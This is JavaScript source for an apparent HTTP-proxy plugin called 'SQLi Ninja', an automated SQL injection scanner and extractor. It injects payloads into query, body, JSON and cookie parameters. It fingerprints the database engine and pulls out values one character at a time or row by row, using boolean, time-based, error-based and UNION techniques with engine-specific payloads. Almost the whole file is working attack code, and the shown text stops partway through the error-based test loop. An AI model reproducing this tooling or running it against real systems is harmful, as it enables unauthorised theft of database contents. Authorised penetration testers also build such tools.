function parseRawRequest(rawText) {
  try {
    const lines = rawText.split(/\r?\n/);
    const firstLine = lines[0];
    const match = firstLine.match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+([^\s]+)\s+HTTP/i);
    if (!match) return null;
    const method = match[1].toUpperCase();
    const path = match[2];
    const headers = {};
    let host = "";
    let bodyStart = -1;
    for (let i = 1; i < lines.length; i++) {
      const line = lines[i];
      if (line.trim() === "") {
        bodyStart = i + 1;
        break;
      }
      const colonIdx = line.indexOf(":");
      if (colonIdx > 0) {
        const key = line.substring(0, colonIdx).trim();
        const value = line.substring(colonIdx + 1).trim();
        headers[key] = value;
        if (key.toLowerCase() === "host") host = value;
      }
    }
    const body = bodyStart > 0 ? lines.slice(bodyStart).join("\n") : "";
    return { method, path, host, headers, body };
  } catch {
    return null;
  }
}
function paramsFromRaw(rawText) {
  const params = [];
  const parsed = parseRawRequest(rawText);
  if (!parsed) return params;
  const dec = (s) => {
    try {
      return decodeURIComponent(s.replace(/\+/g, " "));
    } catch {
      return s;
    }
  };
  const qIdx = parsed.path.indexOf("?");
  if (qIdx !== -1) {
    const queryStr = parsed.path.substring(qIdx + 1);
    for (const part of queryStr.split("&")) {
      if (!part) continue;
      const eq = part.indexOf("=");
      const name = eq === -1 ? part : part.substring(0, eq);
      const value = eq === -1 ? "" : part.substring(eq + 1);
      if (name) params.push({ name: dec(name), value: dec(value), type: "query" });
    }
  }
  const body = (parsed.body || "").trim();
  if (body) {
    let handled = false;
    try {
      const json = JSON.parse(body);
      for (const p of extractNestedParams(json)) params.push(p);
      handled = true;
    } catch {
    }
    if (!handled) {
      for (const part of body.split("&")) {
        if (!part) continue;
        const eq = part.indexOf("=");
        const name = eq === -1 ? part : part.substring(0, eq);
        const value = eq === -1 ? "" : part.substring(eq + 1);
        if (name) params.push({ name: dec(name), value: dec(value), type: "body" });
      }
    }
  }
  const cookieKey = Object.keys(parsed.headers).find((k) => k.toLowerCase() === "cookie");
  if (cookieKey) {
    for (const part of parsed.headers[cookieKey].split(";")) {
      const seg = part.trim();
      if (!seg) continue;
      const eq = seg.indexOf("=");
      const name = eq === -1 ? seg : seg.substring(0, eq);
      const value = eq === -1 ? "" : seg.substring(eq + 1);
      if (name) params.push({ name, value, type: "cookie" });
    }
  }
  return params;
}
function injectIntoRaw(rawText, paramName, paramType, value) {
  const parsed = parseRawRequest(rawText);
  if (!parsed) return rawText;
  const normalizedCRLF = rawText.includes("\r\n");
  const lines = rawText.split(/\r?\n/);
  const enc = (v) => encodeURIComponent(v);
  if (paramType === "query") {
    const qIdx = parsed.path.indexOf("?");
    const base = qIdx >= 0 ? parsed.path.substring(0, qIdx) : parsed.path;
    const qs = new URLSearchParams(qIdx >= 0 ? parsed.path.substring(qIdx + 1) : "");
    qs.set(paramName, value);
    lines[0] = lines[0].replace(parsed.path, `${base}?${qs.toString()}`);
  } else if (paramType === "cookie") {
    for (let i = 1; i < lines.length; i++) {
      if (lines[i].trim() === "") break;
      if (lines[i].toLowerCase().startsWith("cookie:")) {
        lines[i] = lines[i].replace(
          new RegExp(`(${paramName}=)[^;]*`),
          `$1${value}`
        );
      }
    }
  } else if (paramType === "body" || paramType === "json") {
    let bodyStart = -1;
    for (let i = 1; i < lines.length; i++) {
      if (lines[i].trim() === "") {
        bodyStart = i + 1;
        break;
      }
    }
    if (bodyStart > 0) {
      const body = lines.slice(bodyStart).join("\n");
      let newBody = body;
      try {
        const json = JSON.parse(body);
        setNestedValue(json, paramName, value);
        newBody = JSON.stringify(json);
      } catch {
        const params = new URLSearchParams(body);
        params.set(paramName, value);
        newBody = params.toString();
      }
      const head = lines.slice(0, bodyStart);
      for (let i = 1; i < head.length; i++) {
        if (head[i].toLowerCase().startsWith("content-length:")) {
          head[i] = `Content-Length: ${utf8Encode(newBody).length}`;
        }
      }
      return [...head, newBody].join(normalizedCRLF ? "\r\n" : "\n");
    }
  }
  return lines.join(normalizedCRLF ? "\r\n" : "\n");
}
function delay(ms) {
  return new Promise((resolve) => {
    try {
      globalThis.setTimeout(resolve, ms);
    } catch {
      resolve();
    }
  });
}
async function sendRequest(requestId, paramName, paramType, injectedValue, rawRequest, sid = "", maxAttempts = 3) {
  const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
  try {
    let url = "";
    let injected = "";
    if (requestId) {
      const result = await sdk.requests.get(requestId);
      if (!result?.request) return null;
      const request = result.request;
      const isTls = request.getTls?.() ?? false;
      const host = request.getHost?.() || "";
      const port = request.getPort?.() || (isTls ? 443 : 80);
      url = `${isTls ? "https" : "http"}://${host}:${port}`;
      let rawText = "";
      if (typeof request.getRaw === "function") {
        const rb = request.getRaw();
        rawText = typeof rb === "string" ? rb : utf8Decode(rb?.toBytes ? rb.toBytes() : rb);
      } else if (typeof request.toSpecRaw === "function") {
        const sr = request.toSpecRaw();
        const rb = sr.getRaw();
        rawText = typeof rb === "string" ? rb : utf8Decode(rb);
      }
      injected = injectIntoRaw(rawText, paramName, paramType, injectedValue);
    } else if (rawRequest) {
      injected = injectIntoRaw(rawRequest, paramName, paramType, injectedValue);
      const parsed = parseRawRequest(rawRequest);
      if (!parsed) return null;
      const isHttps = (parsed.headers["X-Scheme"] || "").toLowerCase() === "https" || (parsed.headers["x-forwarded-proto"] || "").toLowerCase() === "https";
      const hasPort = parsed.host.includes(":");
      const port = hasPort ? parseInt(parsed.host.split(":")[1]) : isHttps ? 443 : 80;
      const hostname = parsed.host.split(":")[0];
      url = `${port === 443 || isHttps ? "https" : "http"}://${hostname}:${port}`;
    } else {
      return null;
    }
    const encoded = utf8Encode(injected);
    let lastErr = null;
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      if (isAborted(sid)) return null;
      const startTime = Date.now();
      try {
        const specRaw = new RequestSpecRaw(url);
        specRaw.setRaw(encoded);
        const resp = await sdk.requests.send(specRaw);
        return {
          body: resp.response?.getBody()?.toText() || "",
          status: resp.response?.getCode() || 0,
          time: Date.now() - startTime
        };
      } catch (e) {
        lastErr = e;
        const msg = String(e?.message || e);
        const transient = /timeout|timed out|connection|reset|refused|operationfailed|temporarily/i.test(msg);
        if (!transient || attempt === maxAttempts) break;
        sendLog2(`    [retry ${attempt}/${maxAttempts - 1}] ${msg.slice(0, 70)} \u2014 retrying...`, "warn");
        if (isAborted(sid)) return null;
        await delay(600 * attempt);
      }
    }
    const stack = (lastErr?.stack || "").split("\n").slice(0, 3).join(" | ");
    sendLog2(`[DEBUG] sendRequest error: ${lastErr?.message || lastErr} @ ${stack}`, "error");
    return null;
  } catch (e) {
    const stack = (e?.stack || "").split("\n").slice(0, 3).join(" | ");
    sendLog2(`[DEBUG] sendRequest error: ${e?.message || e} @ ${stack}`, "error");
    return null;
  }
}
function setNestedValue(obj, path, value) {
  const parts = path.split(".");
  let current = obj;
  for (let i = 0; i < parts.length - 1; i++) {
    const key = parts[i];
    const arrMatch2 = key.match(/^(\w+)\[(\d+)\]$/);
    if (arrMatch2) {
      current = current[arrMatch2[1]][parseInt(arrMatch2[2])];
    } else {
      if (!(key in current)) current[key] = {};
      current = current[key];
    }
  }
  const lastKey = parts[parts.length - 1];
  const arrMatch = lastKey.match(/^(\w+)\[(\d+)\]$/);
  if (arrMatch) {
    current[arrMatch[1]][parseInt(arrMatch[2])] = value;
  } else {
    current[lastKey] = value;
  }
}
function extractNestedParams(obj, prefix = "") {
  const params = [];
  if (Array.isArray(obj)) {
    obj.forEach((item, index) => {
      if (typeof item === "object" && item !== null) {
        params.push(...extractNestedParams(item, `${prefix}[${index}]`));
      } else {
        params.push({
          name: `${prefix}[${index}]`,
          value: String(item),
          type: "json"
        });
      }
    });
  } else if (typeof obj === "object" && obj !== null) {
    for (const [key, value] of Object.entries(obj)) {
      const fullKey = prefix ? `${prefix}.${key}` : key;
      if (typeof value === "object" && value !== null) {
        params.push(...extractNestedParams(value, fullKey));
      } else {
        params.push({
          name: fullKey,
          value: String(value),
          type: "json"
        });
      }
    }
  }
  return params;
}
async function sendVectorPayload(v, tail, sid = "") {
  const fullValue = `${v.origValue}${tail}`;
  return sendRequest(v.requestId, v.param, v.paramType, fullValue, v.rawRequest, sid);
}
function buildConditionValue(v, condition) {
  return `${v.prefix}AND ${condition}${v.suffix}`;
}
async function establishRefs(v, sid = "") {
  const sendLog2 = (m, t3 = "info") => _sendLog(m, t3, sid);
  const t = await sendVectorPayload(v, buildConditionValue(v, "1=1"), sid);
  const f = await sendVectorPayload(v, buildConditionValue(v, "1=2"), sid);
  if (!t || !f) return null;
  const baseTime = Math.min(t.time, f.time);
  if (v.technique === "time") {
    return { trueBody: t.body, falseBody: f.body, baseTime, cutoff: 0.5, reliable: true, pagesSeparate: true };
  }
  const t2 = await sendVectorPayload(v, buildConditionValue(v, "2=2"), sid);
  const simTrueSelf = t2 ? pageSimilarity(t.body, t2.body) : 1;
  const simFalseTrue = pageSimilarity(t.body, f.body);
  const cutoff = (simTrueSelf + simFalseTrue) / 2;
  const pagesSeparate = simTrueSelf - simFalseTrue >= 0.12 && simTrueSelf >= 0.6;
  const refs = { trueBody: t.body, falseBody: f.body, baseTime, cutoff, reliable: true, pagesSeparate };
  if (!pagesSeparate) {
    refs.reliable = false;
    sendLog2(`    [oracle] boolean pages don't separate on ${v.param} (true-self ${(simTrueSelf * 100).toFixed(0)}% vs true/false ${(simFalseTrue * 100).toFixed(0)}%)`, "warn");
    return refs;
  }
  const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
  const probeExpr = meta.charFn("'Z'", "1");
  const probeTrue = await evalCondition(v, refs, `${probeExpr}>65`, 5, sid);
  const probeFalse = await evalCondition(v, refs, `${probeExpr}>100`, 5, sid);
  if (!(probeTrue && !probeFalse)) {
    refs.reliable = false;
    sendLog2(`    [oracle] boolean extraction probe failed on ${v.param} (true\u2192${probeTrue}, false\u2192${probeFalse}); comparison payloads not reflected`, "warn");
  }
  return refs;
}
async function evalCondition(v, refs, condition, timeSec = 5, sid = "") {
  if (v.technique === "time") {
    const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
    let payload;
    if (v.dbms === "mssql") {
      payload = `${v.prefix}IF(${condition}) WAITFOR DELAY '0:0:${timeSec}'${v.suffix}`;
    } else {
      payload = `${v.prefix}AND ${meta.sleepIf(condition, timeSec)}${v.suffix}`;
    }
    const r2 = await sendVectorPayload(v, payload, sid);
    if (!r2) return false;
    return r2.time >= refs.baseTime + timeSec * 1e3 - 1200;
  }
  const r = await sendVectorPayload(v, buildConditionValue(v, condition), sid);
  if (!r) return false;
  const simTrue = pageSimilarity(refs.trueBody, r.body);
  return simTrue >= refs.cutoff;
}
async function extractChar(v, refs, sqlExpr, pos, timeSec, sid = "") {
  const throwIfAborted = () => _throwIfAborted(sid);
  const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
  const charExpr = meta.charFn(sqlExpr, String(pos));
  let lo = 0, hi = 127;
  while (lo < hi) {
    throwIfAborted();
    const mid = Math.floor((lo + hi) / 2);
    const greater = await evalCondition(v, refs, `${charExpr}>${mid}`, timeSec, sid);
    if (greater) lo = mid + 1;
    else hi = mid;
  }
  return lo;
}
async function extractLength(v, refs, sqlExpr, timeSec, sid = "") {
  const throwIfAborted = () => _throwIfAborted(sid);
  const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
  const lenExpr = meta.lengthFn(sqlExpr);
  let hi = 1;
  while (await evalCondition(v, refs, `${lenExpr}>${hi}`, timeSec, sid)) {
    throwIfAborted();
    hi *= 2;
    if (hi > 4096) break;
  }
  let lo = 0;
  while (lo < hi) {
    throwIfAborted();
    const mid = Math.floor((lo + hi) / 2);
    const greater = await evalCondition(v, refs, `${lenExpr}>${mid}`, timeSec, sid);
    if (greater) lo = mid + 1;
    else hi = mid;
  }
  return lo;
}
function errorMarkerPayload(dbms, innerExpr) {
  switch (dbms) {
    case "mysql":
      return `EXTRACTVALUE(1,CONCAT(0x7e,(${innerExpr}),0x7e))`;
    case "mssql":
      return `CONVERT(INT,(SELECT '~'+CAST((${innerExpr}) AS NVARCHAR(4000))+'~'))`;
    case "postgresql":
      return `CAST((SELECT '~'||(${innerExpr})::text||'~') AS INT)`;
    case "oracle":
      return `(SELECT UTL_INADDR.GET_HOST_ADDRESS('~'||(${innerExpr})||'~') FROM DUAL)`;
    default:
      return `EXTRACTVALUE(1,CONCAT(0x7e,(${innerExpr}),0x7e))`;
  }
}
async function extractReflected(v, sqlExpr, sid = "") {
  if (v.technique === "error") {
    if (v.dbms === "mysql" || v.dbms === "unknown") {
      let result = "";
      let offset = 1;
      const chunk = 30;
      for (let guard = 0; guard < 200; guard++) {
        const inner = `SELECT SUBSTRING((${sqlExpr}),${offset},${chunk})`;
        const payload2 = `${v.prefix}AND ${errorMarkerPayload("mysql", inner)}${v.suffix}`;
        const r2 = await sendVectorPayload(v, payload2, sid);
        if (!r2) break;
        const val = markerValue(r2.body, payload2);
        if (val === null) break;
        result += val;
        if (val.length < chunk) break;
        offset += chunk;
      }
      return result.length > 0 ? result : null;
    }
    const payload = `${v.prefix}AND ${errorMarkerPayload(v.dbms, sqlExpr)}${v.suffix}`;
    const r = await sendVectorPayload(v, payload, sid);
    if (r) {
      const val = markerValue(r.body, payload);
      if (val !== null) return val;
    }
    return null;
  }
  if (v.technique === "union") {
    const concat = v.dbms === "mssql" ? `'~'+CAST((${sqlExpr}) AS NVARCHAR(4000))+'~'` : v.dbms === "postgresql" || v.dbms === "oracle" ? `'~'||(${sqlExpr})||'~'` : `CONCAT(0x7e,(${sqlExpr}),0x7e)`;
    const payload = `${v.prefix}UNION ALL SELECT ${concat}${v.suffix}`;
    const r = await sendVectorPayload(v, payload, sid);
    if (r) {
      const val = markerValue(r.body, payload);
      if (val !== null) return val;
    }
    return null;
  }
  return null;
}
async function extractValue(v, sqlExpr, refs, timeSec, sid = "") {
  const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  if (v.technique === "error" || v.technique === "union") {
    const reflected = await extractReflected(v, sqlExpr, sid);
    if (reflected !== null) return reflected;
  }
  if (!refs) return "";
  const len = await extractLength(v, refs, sqlExpr, timeSec, sid);
  if (len === 0) return "";
  let out = "";
  for (let pos = 1; pos <= len; pos++) {
    throwIfAborted();
    const code = await extractChar(v, refs, sqlExpr, pos, timeSec, sid);
    out += String.fromCharCode(code);
    sendLog2(`    retrieved: ${out}`, "verbose");
  }
  return out;
}
async function extractMultiRow(v, baseSql, refs, timeSec, rowCap, sid = "") {
  const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
  if (v.technique === "error" || v.technique === "union") {
    const m = baseSql.match(/^SELECT\s+(.+?)\s+FROM\s+([\s\S]+)$/i);
    if (m) {
      const col = m[1];
      const rest = m[2];
      const aggExpr = v.dbms === "mysql" ? `(SELECT GROUP_CONCAT(${col} SEPARATOR 0x7c) FROM ${rest})` : v.dbms === "postgresql" ? `(SELECT string_agg(${col}::text,'|') FROM ${rest})` : v.dbms === "mssql" ? `(SELECT STRING_AGG(CAST(${col} AS NVARCHAR(MAX)),'|') FROM ${rest})` : `(SELECT LISTAGG(${col},'|') WITHIN GROUP (ORDER BY ${col}) FROM ${rest})`;
      const joined = await extractValue(v, aggExpr, refs, timeSec, sid);
      if (joined) return joined.split("|").filter((x) => x.length > 0).slice(0, rowCap);
    }
  }
  if (!refs) return [];
  const count = parseInt(await extractValue(v, meta.countRows(baseSql), refs, timeSec, sid) || "0", 10);
  const n = Math.min(isNaN(count) ? 0 : count, rowCap);
  const rows = [];
  for (let i = 0; i < n; i++) {
    throwIfAborted();
    const rowSql = meta.rowLimit(baseSql, i);
    const val = await extractValue(v, `(${rowSql})`, refs, timeSec, sid);
    rows.push(val);
    sendLog2(`[+] row ${i + 1}/${n}: ${val}`, "success");
  }
  return rows;
}
async function fingerprintDbmsBlind(v, refs, sid = "") {
  const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  const probes = [
    ["mysql", "ORD('A')=65", "ORD('A')=66"],
    // ORD/MID → MySQL
    ["mssql", "LEN('abc')=3", "LEN('abc')=4"],
    // LEN → MSSQL/Sybase
    ["oracle", "BITAND(5,1)=1", "BITAND(5,1)=2"],
    // BITAND → Oracle
    ["sqlite", "SQLITE_VERSION()>'0'", "SQLITE_VERSION()>'999'"],
    // SQLITE_VERSION() → SQLite
    ["postgresql", "('a'||'b')='ab'", "('a'||'b')='az'"]
    // || string concat → PostgreSQL
  ];
  for (const [name, condT, condF] of probes) {
    throwIfAborted();
    if (await evalCondition(v, refs, condT, 5, sid) && !await evalCondition(v, refs, condF, 5, sid)) {
      sendLog2(`[+] Back-end DBMS identified via blind fingerprint: ${name.toUpperCase()}`, "success");
      return name;
    }
  }
  return null;
}
async function deriveTimeVector(v, sid = "") {
  const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  const timeSec = 5;
  const baseR = await sendVectorPayload(v, `${v.prefix}AND 1=1${v.suffix}`, sid);
  const baseTime = baseR ? baseR.time : 700;
  const need = baseTime + timeSec * 1e3 - 1500;
  sendLog2(`[*] Probing for a time-based oracle on ${v.param} (no page-content dependency)...`, "info");
  for (const [dbms, payloads] of Object.entries(TIME_PAYLOADS)) {
    for (const { payload } of payloads) {
      throwIfAborted();
      const tail = `${v.prefix}${replacePayloadPlaceholders(payload, timeSec)}${v.suffix}`;
      const r = await sendVectorPayload(v, tail, sid);
      if (r && r.time >= need) {
        const r2 = await sendVectorPayload(v, tail, sid);
        if (r2 && r2.time >= need) {
          sendLog2(`[+] Time-based oracle found (${dbms.toUpperCase()}) \u2014 delay ${r2.time}ms`, "success");
          return { ...v, technique: "time", dbms };
        }
      }
    }
  }
  sendLog2(`[!] No time-based oracle responded on ${v.param}.`, "warn");
  return null;
}
function setVectorDbms(v, dbms) {
  v.dbms = dbms;
  const key = vectorKey(v.requestId, v.param);
  for (const x of confirmedVectorsAll[key] || []) if (x.dbms === "unknown") x.dbms = dbms;
  const best = confirmedVectors[key];
  if (best && best.dbms === "unknown") best.dbms = dbms;
}
async function prepareExtraction(requestId, param, timeSec, sid = "") {
  const sendLog2 = (m, t = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  const candidates = pickVectors(requestId, param);
  if (candidates.length === 0) {
    sendLog2(`[!] No confirmed injection point. Run a scan first.`, "error");
    return null;
  }
  for (const v of candidates) {
    throwIfAborted();
    if (v.technique === "error" || v.technique === "union") {
      sendLog2(`[*] Extracting via ${v.technique.toUpperCase()} (${v.dbms}) on param ${v.param}`, "info");
      return { v, refs: null };
    }
    if (v.technique === "boolean") {
      let refs = await establishRefs(v, sid);
      if (refs && refs.reliable) {
        sendLog2(`[*] Extracting via BOOLEAN (${v.dbms}) on param ${v.param}`, "info");
        return { v, refs };
      }
      if (refs && refs.pagesSeparate) {
        const fp = await fingerprintDbmsBlind(v, refs, sid);
        if (fp && fp !== v.dbms) {
          setVectorDbms(v, fp);
          refs = await establishRefs(v, sid);
          if (refs && refs.reliable) {
            sendLog2(`[*] Extracting via BOOLEAN (${v.dbms}) on param ${v.param}`, "info");
            return { v, refs };
          }
        }
      }
      const timeV = candidates.find((c) => c.technique === "time");
      if (timeV) {
        if (timeV.dbms === "unknown" && v.dbms !== "unknown") setVectorDbms(timeV, v.dbms);
        sendLog2(`[*] Boolean oracle unreliable here \u2014 switching to TIME-BASED (${timeV.dbms}) [slower but accurate]`, "warn");
        const tr = await establishRefs(timeV, sid);
        if (tr) return { v: timeV, refs: tr };
      }
      if (refs && refs.pagesSeparate) {
        sendLog2(`[!] Proceeding with low-confidence boolean inference (DBMS ${v.dbms}; results may be unreliable)`, "warn");
        return { v, refs };
      }
    }
    if (v.technique === "time") {
      const refs = await establishRefs(v, sid);
      if (refs) {
        sendLog2(`[*] Extracting via TIME-BASED (${v.dbms}) on param ${v.param} [slower but accurate]`, "info");
        return { v, refs };
      }
    }
  }
  const seed = candidates.find((c) => c.technique === "boolean") || candidates[0];
  if (seed) {
    const tv = await deriveTimeVector(seed, sid);
    if (tv) {
      recordVector(tv);
      const tr = await establishRefs(tv, sid);
      if (tr) {
        sendLog2(`[*] Extracting via TIME-BASED (${tv.dbms}) on param ${tv.param} [slower but accurate]`, "info");
        return { v: tv, refs: tr };
      }
    }
  }
  sendLog2(`[!] Could not establish a reliable extraction oracle for this param.`, "error");
  sendLog2(`[i] The page is too dynamic for boolean inference and no time-based delay responded. If you know the DBMS, verify the injection is still live, or try another confirmed parameter.`, "warn");
  return null;
}
function init(sdkInstance) {
  sdk = sdkInstance;
  sdk.api.register("probe", async (_sdk, requestId) => {
    const out = {};
    try {
      out.sdkRequests = Object.getOwnPropertyNames(sdk.requests || {});
    } catch (e) {
      out.sdkRequestsErr = String(e);
    }
    try {
      const result = await sdk.requests.get(requestId);
      const request = result?.request;
      if (request) {
        const proto = Object.getPrototypeOf(request);
        out.requestMethods = proto ? Object.getOwnPropertyNames(proto) : Object.getOwnPropertyNames(request);
        try {
          const spec = request.toSpec?.();
          if (spec) {
            const sp = Object.getPrototypeOf(spec);
            out.specMethods = sp ? Object.getOwnPropertyNames(sp) : Object.getOwnPropertyNames(spec);
          } else {
            out.toSpec = "returned nothing";
          }
        } catch (e) {
          out.toSpecErr = String(e);
        }
        out.hasToSpecRaw = typeof request.toSpecRaw;
        out.hasGetRaw = typeof request.getRaw;
        out.hasGetQuery = typeof request.getQuery;
        out.hasGetBody = typeof request.getBody;
      } else {
        out.noRequest = true;
      }
    } catch (e) {
      out.getErr = String(e);
    }
    return out;
  });
  sdk.api.register("getMeta", async (_sdk, requestId) => {
    try {
      const result = await sdk.requests.get(requestId);
      const req = result?.request;
      if (!req) return { method: "", path: "", host: "" };
      const method = req.getMethod?.() || "";
      let path = req.getPath?.() || "";
      if (!path && typeof req.getRaw === "function") {
        const rb = req.getRaw();
        const raw = typeof rb === "string" ? rb : utf8Decode(rb?.toBytes ? rb.toBytes() : rb);
        const m = raw.match(/^[A-Z]+\s+([^\s?]+)/);
        if (m) path = m[1];
      }
      return { method, path, host: req.getHost?.() || "" };
    } catch (e) {
      return { method: "", path: "", host: "" };
    }
  });
  sdk.api.register("getParams", async (_sdk, requestId) => {
    const result = await sdk.requests.get(requestId);
    if (!result?.request) {
      throw new Error("Request not found");
    }
    const request = result.request;
    const params = [];
    const seen = /* @__PURE__ */ new Set();
    const add = (p) => {
      const key = `${p.type}|${p.name}`;
      if (seen.has(key)) return;
      seen.add(key);
      params.push(p);
    };
    sendLog(`[DEBUG] Parsing request ${requestId}`, "verbose");
    let rawText = "";
    try {
      if (typeof request.getRaw === "function") {
        const rb = request.getRaw();
        rawText = typeof rb === "string" ? rb : utf8Decode(rb?.toBytes ? rb.toBytes() : rb);
      } else if (typeof request.toSpecRaw === "function") {
        const sr = request.toSpecRaw();
        const rb = sr.getRaw();
        rawText = typeof rb === "string" ? rb : utf8Decode(rb);
      }
    } catch (e) {
      sendLog(`[DEBUG] getRaw error: ${e}`, "verbose");
    }
    let rawHadBody = false;
    if (rawText) {
      const rawParams = paramsFromRaw(rawText);
      for (const p of rawParams) {
        add(p);
        if (p.type === "json" || p.type === "body") rawHadBody = true;
      }
      sendLog(`[DEBUG] Parsed ${rawParams.length} param(s) from raw request`, "verbose");
    }
    if (!rawHadBody) {
      const bodyStr = request.getBody?.()?.toText?.() || "";
      sendLog(`[DEBUG] structured body length: ${bodyStr.length}`, "verbose");
      if (bodyStr.trim()) {
        const trimmed = bodyStr.trim();
        let parsedJson = false;
        try {
          const json = JSON.parse(trimmed);
          for (const p of extractNestedParams(json)) add(p);
          parsedJson = true;
        } catch {
        }
        if (!parsedJson) {
          const ctH = request.getHeader?.("Content-Type");
          const ct = (Array.isArray(ctH) ? ctH[0] : ctH || "").toLowerCase();
          if (ct.includes("application/json")) {
            sendLog(`[DEBUG] Content-Type is JSON but body did not parse \u2014 check for template placeholders`, "verbose");
          }
          try {
            for (const [name, value] of new URLSearchParams(trimmed).entries()) add({ name, value, type: "body" });
          } catch (e) {
          }
        }
      }
    }
    if (params.length === 0) {
      try {
        const path = request.getPath?.() || "";
        const urlObj = new URL("http://x" + path);
        for (const [name, value] of urlObj.searchParams.entries()) add({ name, value, type: "query" });
      } catch (e) {
      }
      const cookies = request.getHeader?.("Cookie") || [];
      const cookieStr = Array.isArray(cookies) ? cookies[0] : cookies;
      if (cookieStr) {
        for (const part of cookieStr.split(";")) {
          const [name, ...rest] = part.trim().split("=");
          if (name && name.length > 0) add({ name, value: rest.join("="), type: "cookie" });
        }
      }
    }
    sendLog(`[DEBUG] Total params found: ${params.length}`, "verbose");
    return params;
  });
  sdk.api.register("stopScan", async (_sdk, sessionId) => {
    const sid = sessionId || "";
    abortedSessions.add(sid);
    _sendLog(`[!] Stop requested \u2014 finishing current request...`, "warn", sid);
    return { stopped: true };
  });
  sdk.api.register("scan", async (_sdk, config) => {
    const sessionId = config.sessionId || "";
    const sendLog2 = (m, t = "info") => _sendLog(m, t, sessionId);
    abortedSessions.delete(sessionId);
    const { requestId, rawRequest, params, techniques, level, timeSec, verbose } = config;
    const findings = [];
    const prefixSuffixes = getPrefixSuffix(level);
    let originalRequest = null;
    if (requestId) {
      try {
        const reqResult = await sdk.requests.get(requestId);
        originalRequest = reqResult?.request;
      } catch (e) {
      }
    }
    sendLog2(`\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557`, "info");
    sendLog2(`\u2551           SQLi Ninja - Intelligent SQL Injection Scanner     \u2551`, "info");
    sendLog2(`\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D`, "info");
    sendLog2(`[*] Starting scan with level ${level}`, "info");
    sendLog2(`[*] Techniques: ${techniques.join(", ")}`, "info");
    {
      const nB = ghCandidates("boolean", "unknown").length, nE = ghCandidates("error", "unknown").length, nT = ghCandidates("time", "unknown").length;
      sendLog2(`[*] Payload engine: ghauri matrix (${nB} boolean / ${nE} error / ${nT} time entries, per-entry boundaries)`, "info");
    }
    sendLog2(`[*] Parameters: ${params.map((p) => p.name).join(", ")}`, "info");
    sendLog2(`[*] Prefix/suffix combinations: ${prefixSuffixes.length}`, "info");
    sendLog2(``, "info");
    sendLog2(`[*] Fetching baseline response...`, "info");
    const baselineResp = await sendRequest(requestId, params[0]?.name || "", params[0]?.type || "query", params[0]?.value || "", rawRequest, sessionId, 5);
    if (!baselineResp) {
      if (isAborted(sessionId)) {
        sendLog2(`[!] Scan stopped by user`, "warn");
        return findings;
      }
      sendLog2(`[!] Failed to get baseline response (target timed out or unreachable after 5 retries).`, "error");
      sendLog2(`[i] testasp.vulnweb.com / slow targets: open the request in Replay and Send it once to confirm it responds, check the VDI can reach the host, then re-scan. Baseline now retries 5x with backoff; if it still times out the host is likely unreachable from the VDI, not just slow.`, "warn");
      return findings;
    }
    sendLog2(`[+] Baseline: ${baselineResp.status} (${baselineResp.body.length} bytes, ${baselineResp.time}ms)`, "success");
    for (const param of params) {
      if (isAborted(sessionId)) {
        sendLog2(`[!] Scan stopped by user`, "warn");
        break;
      }
      sendLog2(``, "info");
      sendLog2(`[*] Testing parameter: ${param.name} (${param.type})`, "info");
      sendLog2(`[*] Original value: ${param.value.substring(0, 50)}${param.value.length > 50 ? "..." : ""}`, "verbose");
      sendLog2(`[*] Running heuristic tests...`, "info");
      const heuristicPayloads = ["'", '"', ")", "')", '")'];
      let heuristicDbms = "unknown";
      const baseDbmsSig = detectDbms(baselineResp.body);
      for (const hp of heuristicPayloads) {
        const testVal = param.value + hp;
        const resp = await sendRequest(requestId, param.name, param.type, testVal, rawRequest, sessionId);
        if (resp) {
          const dbms = detectDbms(resp.body);
          if (dbms !== "unknown" && dbms !== baseDbmsSig) {
            heuristicDbms = dbms;
            sendLog2(`[+] Heuristic test shows back-end DBMS could be: ${dbms.toUpperCase()}`, "success");
            break;
          }
        }
      }
      let paramReflects = false;
      {
        const canary = `qZx${generateRandom()}${generateRandom()}Xzq`;
        const rp = await sendRequest(requestId, param.name, param.type, param.value + canary, rawRequest, sessionId);
        if (rp && rp.body.includes(canary)) {
          paramReflects = true;
          sendLog2(`[i] Param "${param.name}" is reflected in the response \u2014 reflection guard ON (echoed markers won't count as SQLi).`, "warn");
        }
      }
      let confirmedDbms = heuristicDbms;
      if (techniques.includes("error")) {
        sendLog2(``, "info");
        sendLog2(`[*] Testing ERROR-BASED injection...`, "info");
        const entries = ghCandidates("error", confirmedDbms);
        errDone:
          for (const entry of entries) {
            for (const { pref, suf } of ghBoundaries(entry, level)) {
              if (isAborted(sessionId)) break errDone;
              const probe = ghSubst(entry.payload, "plain", timeSec, param.value);
              const fullPayload = `${param.value}${pref}${probe}${suf}`;
